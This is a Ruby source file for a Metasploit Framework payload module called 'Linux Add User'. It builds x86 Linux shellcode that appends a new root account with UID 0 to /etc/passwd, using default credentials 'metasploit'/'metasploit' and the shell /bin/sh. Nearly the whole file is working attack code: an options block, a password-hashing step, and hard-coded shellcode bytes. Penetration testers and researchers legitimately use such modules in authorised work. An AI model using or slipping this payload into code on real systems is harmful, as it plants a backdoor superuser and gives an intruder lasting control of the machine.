##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# AddUser
# -------
#
# Adds a UID 0 user to /etc/passwd.
#
###
module MetasploitModule
  CachedSize = 97

  include Msf::Payload::Single
  include Msf::Payload::Linux::X86::Prepends

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Add User',
        'Description' => 'Create a new user with UID 0',
        'Author' => [ 'skape', 'vlad902', 'spoonm' ],
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_X86,
        'Privileged' => true
      )
    )

    # Register adduser options
    register_options(
      [
        OptString.new('USER', [ true, 'The username to create', 'metasploit' ]),
        OptString.new('PASS', [ true, 'The password for this user', 'metasploit' ]),
        OptString.new('SHELL', [ false, 'The shell for this user', '/bin/sh' ]),
      ]
    )
  end

  #
  # Dynamically builds the adduser payload based on the user's options.
  #
  def generate(_opts = {})
    user = datastore['USER'] || 'metasploit'
    pass = datastore['PASS'] || 'metasploit'
    shell = datastore['SHELL'] || '/bin/sh'
    str = "#{user}:#{pass.crypt('Az')}:0:0::/:#{shell}\n"
    "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58" \
      "\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70" \
      "\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd" \
      "\x80\x93" + Rex::Arch::X86.call(str.length) + str +
      "\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58" \
      "\xcd\x80"
  end
end
